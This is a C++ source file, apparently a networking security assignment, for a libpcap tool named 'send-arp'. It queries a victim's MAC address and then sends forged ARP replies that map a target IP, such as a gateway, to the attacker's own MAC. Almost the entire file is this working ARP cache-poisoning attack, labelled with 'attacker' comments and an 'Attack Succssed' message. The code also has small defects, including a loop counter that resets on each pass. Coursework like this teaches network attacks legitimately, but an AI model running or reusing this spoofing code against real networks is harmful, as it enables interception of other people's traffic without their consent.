#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <iostream>
#include <libnet.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

EthArpPacket packet;

void getMyMac(Mac *myMac, char*dev){

	int fd;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
		perror("ioctl");
		close(fd);
	}

	*myMac = Mac((uint8_t *)(ifr.ifr_hwaddr.sa_data));
	close(fd);
	return;
}

void getMyIp(Ip *myIp, char*dev){
     int fd;      
	 fd = socket(AF_INET, SOCK_DGRAM, 0);
	 struct ifreq ifr;
	 ifr.ifr_addr.sa_family = AF_INET;
     strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	 
	 if(ioctl(fd, SIOCGIFADDR, &ifr) < 0){
		perror("ioctl");
		close(fd);
	 }
	 
	 *myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
	 close(fd);
	 return;
}


void sendArp(pcap_t* handle, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip, int mode){
	//mode: Request=1, Reply=2 
	packet.eth_.smac_ = eth_smac;
	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode == 1)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else
		packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

int main(int argc, char* argv[]) {
	
	if (argc < 4 || argc % 2){
		usage();
		return -1;
	}

	char* dev = argv[1];
	//print my(attacker's) Information(Mac, Ip)
	
	Mac myMac;
	Ip myIp;
	getMyMac(&myMac, dev);
	getMyIp(&myIp, dev);
	
	cout << "my	Ip	: " << string(myIp) << endl;
	cout << "my	Mac	: " << string(myMac) << endl;

	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev,BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac	senderMac;
	Ip	senderIp;
	//Mac	targetMac;
	Ip	targetIp;

	for (int i = 0; i < argc-2; i += 2){
		senderIp = Ip(argv[2+i]);
		targetIp = Ip(argv[2+i+1]);

		cout << "sender	Ip	: " << string(senderIp) << endl;
		cout << "target	Ip	: " << string(targetIp) << endl;
		
		//getSenderMac
		//sendArp(handle, Mac("FF:FF:FF:FF:FF:FF"), senderMac, myMac, myIp, Mac("00:00:00:00:00:00"), senderIp, 1);
		sendArp(handle, Mac("FF:FF:FF:FF:FF:FF"), myMac, myMac, myIp, Mac("00:00:00:00:00:00"), senderIp, 1);
		struct pcap_pkthdr* header;
		const u_char* replyPacket;
		
		while(1){
			int num = 1;
			printf("%d\n", num++);
			int res = pcap_next_ex(handle, &header, &replyPacket);
			//if (res != 1) break; // return 1 when there's no problem.
			if (res == 0)
				continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				continue;
			}
			EthArpPacket* resPacket = (EthArpPacket *)replyPacket;
			if (resPacket->arp_.sip() == senderIp && resPacket->arp_.tip() == myIp && resPacket->arp_.op() == ArpHdr::Reply && resPacket->eth_.type() == EthHdr::Arp ){
				senderMac = resPacket->arp_.smac();
				break;
			}
		}

		cout << "sender Mac : " << string(senderMac) << endl;

		//send Arp Packet
		sendArp(handle, senderMac, myMac, myMac, targetIp, senderMac, senderIp, 2); 
		cout<< "Attack Succssed" << endl;
	}	
	pcap_close(handle);
}
